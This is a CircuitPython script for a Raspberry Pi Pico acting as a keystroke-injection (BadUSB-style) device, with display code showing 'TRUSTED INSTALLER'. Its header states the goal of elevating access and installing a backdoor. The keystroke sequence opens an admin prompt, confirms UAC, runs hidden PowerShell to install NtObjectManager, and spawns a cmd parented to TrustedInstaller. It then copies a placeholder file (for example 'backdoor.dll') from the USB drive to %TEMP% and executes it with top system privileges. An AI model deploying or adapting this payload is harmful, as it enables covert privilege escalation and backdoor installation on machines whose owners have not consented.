#
#  
# Created By:
#                                                                                                          
#  TTTTTTTTTTTTTTTTTTTTTTTHHHHHHHHH     HHHHHHHHHRRRRRRRRRRRRRRRRR    333333333333333    333333333333333   
#  T:::::::::::::::::::::TH:::::::H     H:::::::HR::::::::::::::::R  3:::::::::::::::33 3:::::::::::::::33 
#  T:::::::::::::::::::::TH:::::::H     H:::::::HR::::::RRRRRR:::::R 3::::::33333::::::33::::::33333::::::3
#  T:::::TT:::::::TT:::::THH::::::H     H::::::HHRR:::::R     R:::::R3333333     3:::::33333333     3:::::3
#  TTTTTT  T:::::T  TTTTTT  H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H::::::HHHHH::::::H    R::::RRRRRR:::::R     33333333:::::3     33333333:::::3 
#          T:::::T          H:::::::::::::::::H    R:::::::::::::RR      3:::::::::::3      3:::::::::::3  
#          T:::::T          H:::::::::::::::::H    R::::RRRRRR:::::R     33333333:::::3     33333333:::::3 
#          T:::::T          H::::::HHHHH::::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#        TT:::::::TT      HH::::::H     H::::::HHRR:::::R     R:::::R3333333     3:::::33333333     3:::::3
#        T:::::::::T      H:::::::H     H:::::::HR::::::R     R:::::R3::::::33333::::::33::::::33333::::::3
#        T:::::::::T      H:::::::H     H:::::::HR::::::R     R:::::R3:::::::::::::::33 3:::::::::::::::33 
#        TTTTTTTTTTT      HHHHHHHHH     HHHHHHHHHRRRRRRRR     RRRRRRR 333333333333333    333333333333333   
#                                                                                                          
#                                                                                                          
#       III Elevate access to the system and install a backdoor or execute file as TRUSTED INSTALLER III
#                                                                                                          
#                                                                                                          
import time
import os
import usb_hid
import digitalio
import board
import busio
import terminalio
import displayio
from adafruit_display_text import label
from adafruit_hid.keyboard import Keyboard, Keycode
from adafruit_hid.keycode import Keycode
from keyboard_layout_win_uk import KeyboardLayout
from adafruit_st7789 import ST7789

# First set some parameters used for shapes and text
BORDER = 12
FONTSCALE = 3
BACKGROUND_COLOR = 0xFFFF00  # Yellow
FOREGROUND_COLOR = 0x000000  # Black
TEXT_COLOR = 0xffffff # White

# Release any resources currently in use for the displays
displayio.release_displays()

tft_clk = board.GP10 # must be a SPI CLK
tft_mosi= board.GP11 # must be a SPI TX
tft_rst = board.GP12
tft_dc  = board.GP8
tft_cs  = board.GP9
spi = busio.SPI(clock=tft_clk, MOSI=tft_mosi)

# Make the displayio SPI bus and the GC9A01 display
display_bus = displayio.FourWire(spi, command=tft_dc, chip_select=tft_cs, reset=tft_rst)
display = ST7789(display_bus, rotation=270, width=240, height=135, rowstart=40, colstart=53)

# Make the display context
splash = displayio.Group()
display.show(splash)

color_bitmap = displayio.Bitmap(display.width, display.height, 1)
color_palette = displayio.Palette(1)
color_palette[0] = BACKGROUND_COLOR

#define led (as backlight) pin as output
tft_bl  = board.GP13 #GPIO pin to control backlight LED
led = digitalio.DigitalInOut(tft_bl)
led.direction = digitalio.Direction.OUTPUT
led.value=True

bg_sprite = displayio.TileGrid(color_bitmap, pixel_shader=color_palette, x=0, y=0)
splash.append(bg_sprite)

# This function creates colorful rectangular box 
def inner_rectangle():
    # Draw a smaller inner rectangle
    inner_bitmap = displayio.Bitmap(display.width - BORDER * 2, display.height - BORDER * 2, 1)
    inner_palette = displayio.Palette(1)
    inner_palette[0] = FOREGROUND_COLOR
    inner_sprite = displayio.TileGrid(inner_bitmap, pixel_shader=inner_palette, x=BORDER, y=BORDER)
    splash.append(inner_sprite)
    
#Function to print data on TFT
def print_onTFT(text, x_pos, y_pos): 
    text_area = label.Label(terminalio.FONT, text=text, color=TEXT_COLOR)
    text_group = displayio.Group(scale=FONTSCALE,x=x_pos,y=y_pos,)
    text_group.append(text_area)  # Subgroup for text scaling
    splash.append(text_group)
    
inner_rectangle()
print_onTFT("TRUSTED", 55, 40)
print_onTFT("INSTALLER", 40, 80)
time.sleep(3)

try:
    
    keyboard = Keyboard(usb_hid.devices)
    keyboard_layout = KeyboardLayout(keyboard)
    time.sleep(0.3)
    keyboard.send(Keycode.LEFT_CONTROL, Keycode.W) #Closes folder if Mass Storage Mode is On
    time.sleep(0.3)
    #Open CMD Prompt and begin elevation
    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(1)
    keyboard_layout.write('cmd.exe')
    time.sleep(0.5)
    keyboard.send(Keycode.LEFT_CONTROL, Keycode.SHIFT, Keycode.ENTER) #Open as Admin
    time.sleep(0.5)
    keyboard.send(Keycode.ALT, Keycode.Y)
    time.sleep(1)
    keyboard_layout.write('powershell  -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Unrestricted Install-Module -Name NtObjectManagercmd.exe')
    time.sleep(1)
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    keyboard_layout.write('y')
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    keyboard_layout.write('y')
    keyboard.send(Keycode.ENTER)
    time.sleep(0.3)
    keyboard_layout.write('powershell  -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Unrestricted Start-Service -Name TrustedInstaller; $parent = Get-NtProcess -ServiceName TrustedInstaller; $proc = New-Win32Process cmd.exe -CreationFlags NewConsole -ParentProcess $parent')
    time.sleep(1)
    keyboard.send(Keycode.ENTER)

    #Wait for background process to finish...
    time.sleep(3)
    keyboard.send(Keycode.WINDOWS, Keycode.X)
    time.sleep(0.5)
    keyboard_layout.write('A')
    time.sleep(0.5)
    keyboard.send(Keycode.ALT, Keycode.Y)
    time.sleep(1.5)
    #Replace with your device Label below (YOUR-DEVICE-LABEL)
    keyboard_layout.write("$DriveLabel = 'YOUR-DEVICE-LABEL'; $drive = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DriveLabel }; if ($drive) { Set-Location ($drive.DeviceID + '\\scripts') }")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    #Name of file to copy to Temp (YOUR_FILE) ex:backdoor.dll
    keyboard_layout.write("$fullPath = (Get-Location).Path + '\\YOUR_FILE'; Copy-Item -Path $fullPath -Destination $env:TEMP")
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    keyboard_layout.write('exit')
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    #TRUSTED INSTALLER CMD PROMPT
    #Replace with (YOUR_FILE) or modify and Execute commands as NT AUTHORITY/TRUSTED INSTALLER
    keyboard_layout.write('cd %TEMP%')
    keyboard.send(Keycode.ENTER)
    time.sleep(0.5)
    keyboard_layout.write('YOUR_FILE')
    keyboard.send(Keycode.ENTER)
    keyboard_layout.write('exit')
    keyboard.send(Keycode.ENTER)
    
    
    
    lst = [0.5,0.2,0,0.1,0.01]
    for i in range(len(lst)):
        for j in range(10):
            led.value = True
            time.sleep(lst[i])
            led.value = False
            time.sleep(lst[i])

    led.value = True
    keyboard.release_all()
    
except Exception as ex:
    keyboard.release_all()
    raise ex



